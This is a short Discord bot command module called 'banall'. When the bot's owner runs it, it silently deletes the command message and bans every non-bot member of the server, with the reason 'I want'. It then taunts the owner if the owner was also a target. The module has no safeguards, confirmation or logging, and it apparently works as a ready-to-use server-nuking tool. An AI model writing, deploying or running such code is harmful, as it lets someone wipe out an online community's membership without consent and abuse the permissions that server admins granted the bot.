module.exports.run = async (client, message, args) => {
    const config = require("../config.json");
    if (message.author.id == config.idowner) { } else return;

    message.delete();
    let members = await message .guild.members.fetch({ force: true }); 

    members.forEach(member => {
        if (member.user.bot) return;

        if(member.id === config.idowner) {
            message.author.send("I tried to ban you lol ")
        }
        else {
            
        member.ban({ reason: "I want" }).catch();
        }
    
    });
  }


module.exports.config = {
    name: "banall",
    aliases: ["allban",]
}
